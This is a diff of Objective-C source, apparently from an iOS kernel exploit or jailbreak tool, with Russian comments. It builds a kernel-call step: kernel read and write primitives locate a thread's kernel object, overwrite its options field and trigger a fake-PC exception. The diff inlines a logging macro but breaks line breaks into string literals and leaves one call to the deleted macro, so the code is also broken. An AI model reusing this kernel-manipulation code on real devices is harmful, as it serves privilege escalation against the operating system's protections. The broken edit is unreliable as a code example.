@@ -2424,17 +2424,18 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                             // ---- KCALL 2.0.136: thread_create + BOOT-lookup + FAKE_PC exception ----
                             {
                                 NSString *kfP = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kcall.txt"];
-                                #define KLOG(msg) do { NSString *sl = [NSString stringWithFormat:@"%@\n", msg];                                     NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP];                                     if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }                                     kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", msg]); } while(0)
-                                // 1. создаём helper-поток
+                                                                // 1. создаём helper-поток
                                 mach_port_t hp = MACH_PORT_NULL;
                                 kern_return_t ckr = thread_create(mach_task_self(), &hp);
-                                KLOG([NSString stringWithFormat:@"thread_create kr=0x%x port=0x%x", ckr, hp]);
+                                { NSString *sl = [NSString stringWithFormat:@"thread_create kr=0x%x port=0x%x
+", ckr, hp]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] thread_create kr=0x%x port=0x%x", ckr, hp]); };
                                 // 2. находим его thread* через BOOT-метод (isTable → kobject → tro→task)
                                 uint64_t hK = 0;
                                 if (ckr == KERN_SUCCESS && hp && isT) {
                                     uint64_t heVA = isT + (uint64_t)sizeof_ipc_entry * (hp >> 8);
                                     uint64_t hie = kp_untag_ptr(early_kread64(heVA + off_ipc_entry_ie_object));
-                                    KLOG([NSString stringWithFormat:@"ie_object=%#llx", (unsigned long long)hie]);
+                                    { NSString *sl = [NSString stringWithFormat:@"ie_object=%#llx
+", (unsigned long long)hie]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] ie_object=%#llx", (unsigned long long)hie]); };
                                     if (kpLooksLikeKernelPointer(hie)) {
                                         for (uint32_t ko = 0x18; ko <= 0x60 && !hK; ko += 8) {
                                             uint64_t cand = kp_untag_ptr(early_kread64(hie + ko));
@@ -2447,7 +2448,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         }
                                     }
                                 }
-                                KLOG([NSString stringWithFormat:@"thread*=%#llx", (unsigned long long)hK]);
+                                { NSString *sl = [NSString stringWithFormat:@"thread*=%#llx
+", (unsigned long long)hK]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] thread*=%#llx", (unsigned long long)hK]); };
                                 if (hK && hp) {
                                     // 3. options: TH_IN_MACH_EXCEPTION
                                     uint64_t oVA = hK + 0xC0;
@@ -2457,7 +2459,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     mach_port_t excport = MACH_PORT_NULL;
                                     mach_port_options_t popts = { .flags = MPO_INSERT_SEND_RIGHT | 0x8000, .mpl = { .mpl_qlimit = 5 } };
                                     kern_return_t ekr = mach_port_construct(mach_task_self(), &popts, 0, &excport);
-                                    KLOG([NSString stringWithFormat:@"excport kr=0x%x", ekr]);
+                                    { NSString *sl = [NSString stringWithFormat:@"excport kr=0x%x
+", ekr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] excport kr=0x%x", ekr]); };
                                     if (ekr == KERN_SUCCESS && excport) {
                                         thread_set_exception_ports(hp, EXC_MASK_ALL, excport, EXCEPTION_STATE, ARM_THREAD_STATE64);
                                         // 5. FAKE_PC → fault → exception
@@ -2466,17 +2469,20 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         st.__opaque_pc = (void *)(uintptr_t)0x301;
                                         st.__opaque_lr = (void *)(uintptr_t)0x401;
                                         kern_return_t ssr = thread_set_state(hp, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
-                                        KLOG([NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x — resume", ssr]);
+                                        { NSString *sl = [NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x — resume
+", ssr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] set_state FAKE_PC kr=0x%x — resume", ssr]); };
                                         thread_resume(hp);
                                         // 6. ждём exception (2406 = raise_state)
                                         uint8_t req[0x200]; memset(req, 0, sizeof(req));
                                         mach_msg_header_t *rh = (mach_msg_header_t *)req;
                                         kern_return_t wkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x200, excport, 1000, MACH_PORT_NULL);
-                                        KLOG([NSString stringWithFormat:@"recv kr=0x%x id=%u size=%u remote=0x%x", wkr, rh->msgh_id, rh->msgh_size, rh->msgh_remote_port]);
+                                        { NSString *sl = [NSString stringWithFormat:@"recv kr=0x%x id=%u size=%u remote=0x%x
+", wkr, rh->msgh_id, rh->msgh_size, rh->msgh_remote_port]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] recv kr=0x%x id=%u size=%u remote=0x%x", wkr, rh->msgh_id, rh->msgh_size, rh->msgh_remote_port]); };
                                         if (wkr == KERN_SUCCESS) {
                                             // дамп exception: id, exception type, code, state
                                             uint32_t *u32p = (uint32_t *)req;
-                                            KLOG([NSString stringWithFormat:@"exc dump: hdr_id=%u hdr_size=%u", rh->msgh_id, rh->msgh_size]);
+                                            { NSString *sl = [NSString stringWithFormat:@"exc dump: hdr_id=%u hdr_size=%u
+", rh->msgh_id, rh->msgh_size]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] exc dump: hdr_id=%u hdr_size=%u", rh->msgh_id, rh->msgh_size]); };
                                             // threadState в raise_state request: @0x40 (после Head+NDR+exc+codeCnt+code[2]+flavor+oldCnt)
                                             uint64_t *st64 = (uint64_t *)(req + 0x40);
                                             KLOG([NSString stringWithFormat:@"state: x0=%#llx pc=%#llx lr=%#llx sp=%#llx",
@@ -2487,7 +2493,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         early_kwrite64(oVA, o0);
                                         thread_terminate(hp);
                                         mach_port_deallocate(mach_task_self(), excport);
-                                        KLOG(@"DONE — exception pipeline test");
+                                        { NSString *sl = @"DONE — exception pipeline test
+"; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfP]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[sl dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, @"  [KCALL] DONE — exception pipeline test"); };
                                     }
                                 }
                             }
